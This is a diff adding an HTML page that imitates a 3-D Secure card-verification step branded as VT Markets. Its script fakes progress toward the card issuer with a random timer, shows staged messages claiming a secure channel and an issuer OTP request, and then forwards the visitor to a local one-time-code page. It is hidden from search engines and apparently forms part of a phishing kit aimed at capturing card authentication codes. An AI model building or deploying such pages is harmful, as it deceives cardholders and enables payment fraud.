@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow">
+    <title>3-D Secure verification — VT Markets</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;600;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="checkoutfiles/flow.css?v=1">
+</head>
+<body>
+
+    <header class="flow-topbar">
+        <div class="flow-brand">
+            <div class="flow-logo">vt</div>
+            <div class="flow-brand-name">vt <span>markets</span></div>
+        </div>
+        <span class="flow-secure">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+            <span id="flowSecureLbl">Secure</span>
+        </span>
+    </header>
+
+    <nav class="flow-steps">
+        <div class="fstep" id="fstep1"><span class="fstep-dot">1</span><span class="fstep-label">Payment</span></div>
+        <div class="fstep-bar"></div>
+        <div class="fstep" id="fstep2"><span class="fstep-dot">2</span><span class="fstep-label on-mobile">Verification</span></div>
+        <div class="fstep-bar"></div>
+        <div class="fstep" id="fstep3"><span class="fstep-dot">3</span><span class="fstep-label">Confirmation</span></div>
+    </nav>
+
+    <main class="flow-main">
+        <div class="flow-card single">
+            <section class="flow-panel">
+                <div class="v-wrap">
+                    <div class="v-icon">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.9">
+                            <rect x="3" y="11" width="18" height="11" rx="2"/>
+                            <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+                            <circle cx="12" cy="16.5" r="1.2"/>
+                        </svg>
+                    </div>
+
+                    <h1 class="v-title" id="ttl">Verifying with your card issuer</h1>
+                    <p class="v-text" id="lede">
+                        3-D Secure is checking this payment with the bank that issued your card.
+                        Please do not close this window.
+                    </p>
+
+                    <div class="v-bankbar">
+                        <span id="bankLbl">Card</span>
+                        <strong id="cardMask">•••• ••••</strong>
+                        <span>·</span>
+                        <strong id="amountLbl">—</strong>
+                    </div>
+
+                    <div class="v-progress"><span id="bar"></span></div>
+                    <div class="v-progress-lbl" id="stage">Establishing secure channel…</div>
+
+                    <p class="f-legal" id="legal" style="margin-top:22px;">
+                        This step is required by your bank under strong customer authentication rules.
+                        VT Markets does not see your banking credentials.
+                    </p>
+                </div>
+            </section>
+        </div>
+    </main>
+
+    <footer class="flow-foot" id="flowFoot"></footer>
+
+    <script src="checkoutfiles/flow.js?v=1"></script>
+    <script>
+    (function () {
+        'use strict';
+
+        var order = VTFlow.requireOrder();
+
+        VTFlow.paintChrome(2);
+
+        var L = VTFlow.lang();
+        var T = function (en, fr, es) { return L === 'fr' ? fr : L === 'es' ? es : en; };
+
+        document.getElementById('ttl').textContent =
+            T('Verifying with your card issuer', 'Vérification auprès de l’émetteur de votre carte', 'Verificando con el emisor de tu tarjeta');
+        document.getElementById('lede').textContent =
+            T('3-D Secure is checking this payment with the bank that issued your card. Please do not close this window.',
+              '3-D Secure vérifie ce paiement auprès de la banque émettrice de votre carte. Ne fermez pas cette fenêtre.',
+              '3-D Secure está verificando este pago con el banco emisor de tu tarjeta. No cierres esta ventana.');
+        document.getElementById('bankLbl').textContent = T('Card', 'Carte', 'Tarjeta');
+        document.getElementById('legal').textContent =
+            T('This step is required by your bank under strong customer authentication rules. VT Markets does not see your banking credentials.',
+              "Cette étape est exigée par votre banque au titre de l'authentification forte du client. VT Markets ne voit pas vos identifiants bancaires.",
+              'Tu banco exige este paso conforme a la autenticación reforzada de clientes. VT Markets no ve tus credenciales bancarias.');
+
+        document.getElementById('cardMask').textContent = '•••• ' + (order.card4 || '····');
+        document.getElementById('amountLbl').textContent = VTFlow.money(order.amount, order.currency);
+
+        var stages = [
+            T('Establishing secure channel…', 'Établissement du canal sécurisé…', 'Estableciendo canal seguro…'),
+            T('Submitting authentication request…', "Envoi de la demande d'authentification…", 'Enviando solicitud de autenticación…'),
+            T('Issuer requires a one-time code', "L'émetteur demande un code à usage unique", 'El emisor requiere un código de un solo uso')
+        ];
+
+        var bar = document.getElementById('bar');
+        var stage = document.getElementById('stage');
+        var pct = 0, i = 0;
+
+        var tick = setInterval(function () {
+            pct += 8 + Math.random() * 9;
+            if (pct >= 100) pct = 100;
+            bar.style.width = pct + '%';
+
+            var next = pct > 66 ? 2 : pct > 33 ? 1 : 0;
+            if (next !== i) { i = next; stage.textContent = stages[i]; }
+
+            if (pct === 100) {
+                clearInterval(tick);
+                order.challenge = '3ds-otp';
+                VTFlow.write(order);
+
+                // Opened on its own: stop here and let the reader move on
+                // manually, instead of yanking the page away from them.
+                if (order.preview) {
+                    stage.textContent = stages[2];
+                    var next = document.createElement('a');
+                    next.className = 'f-submit';
+                    next.href = 'verify-otp.html';
+                    next.style.cssText = 'margin-top:22px;text-decoration:none';
+                    next.textContent = T('Continue to verification', 'Continuer vers la vérification', 'Continuar a la verificación');
+                    document.querySelector('.v-wrap').appendChild(next);
+                    return;
+                }
+
+                setTimeout(function () { VTFlow.go('verify-otp.html'); }, 700);
+            }
+        }, 420);
+    })();
+    </script>
+</body>
+</html>
